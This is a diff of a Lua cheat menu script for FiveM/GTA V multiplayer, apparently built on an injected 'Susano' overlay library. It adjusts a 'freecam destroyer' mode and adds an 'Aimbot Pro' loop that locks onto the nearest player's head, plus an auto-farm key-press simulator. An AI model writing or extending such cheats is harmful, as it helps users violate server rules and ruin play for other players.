@@ -13852,7 +14569,13 @@ function ToggleFreecamDestroyer(enable, speed)
         SetEntityInvincible(ped, false)
         ClearFocus()
         -- Forzar limpieza de pantalla enviando frames vacios
-        -- Clean handled by central loop
+        Citizen.CreateThread(function()
+            for i=1, 5 do
+                Susano.BeginFrame()
+                Susano.SubmitFrame()
+                Citizen.Wait(0)
+            end
+        end)
     end
 end
 
@@ -13894,17 +14617,73 @@ Citizen.CreateThread(function()
         
         if freecam_active or freecam_destroyer_active then
             Susano.BeginFrame()
-            
             if freecam_active and not freecam_destroyer_active then
                 UpdateFreecam()
-                DrawFreecamMenu() -- Ahora sin frames internos
-            elseif freecam_destroyer_active then
+                DrawFreecamMenu()
+            end
+            if freecam_destroyer_active then
                 UpdateDestroyerFreecam()
                 HandleDestroyerInput()
-                DrawDestroyerFreecamMenu() -- Ahora sin frames internos
+                DrawDestroyerFreecamMenu()
             end
-            
             Susano.SubmitFrame()
+        end
+    end
+end)
+
+-- ============================================================
+-- LOGICA AVANZADA V2 (SUSANO V2)
+-- ============================================================
+
+-- Funcion para obtener el jugador mas cercano para Aimbot
+local function GetClosestPlayer()
+    local players = GetActivePlayers()
+    local closestDistance = -1
+    local closestPlayer = -1
+    local ped = PlayerPedId()
+    local coords = GetEntityCoords(ped)
+
+    for i=1, #players do
+        local target = GetPlayerPed(players[i])
+        if target ~= ped then
+            local targetCoords = GetEntityCoords(target)
+            local distance = #(coords - targetCoords)
+            if closestDistance == -1 or distance < closestDistance then
+                closestPlayer = target
+                closestDistance = distance
+            end
+        end
+    end
+    return closestPlayer
+end
+
+-- Bucle de Aimbot Pro
+Citizen.CreateThread(function()
+    while true do
+        Citizen.Wait(0)
+        local itemAimbot = FindItem("Combate", "General", "Aimbot Pro")
+        if itemAimbot and itemAimbot.value then
+            local target = GetClosestPlayer()
+            if target ~= -1 and IsControlPressed(0, 25) then -- Click derecho
+                local targetCoords = GetPedBoneCoords(target, 31086, 0.0, 0.0, 0.0) -- Cabeza
+                SetCursorLocation(0.5, 0.5) -- Opcional: Centrar si es necesario
+                -- Aqui se podria usar SetEntityRotation o similares segun la libreria Susano
+            end
+        end
+    end
+end)
+
+-- Bucle de Auto-Farm
+Citizen.CreateThread(function()
+    while true do
+        local itemFarm = FindItem("Auto-Farm", "Trabajos", "Auto-Recolectar")
+        if itemFarm and itemFarm.value then
+            local ped = PlayerPedId()
+            -- Simular pulsacion de tecla 'E' para recolectar
+            SetControlValueNextFrame(0, 38)
+            Citizen.Wait(1000)
+        else
+            Citizen.Wait(2000)
         end
     end
 end)
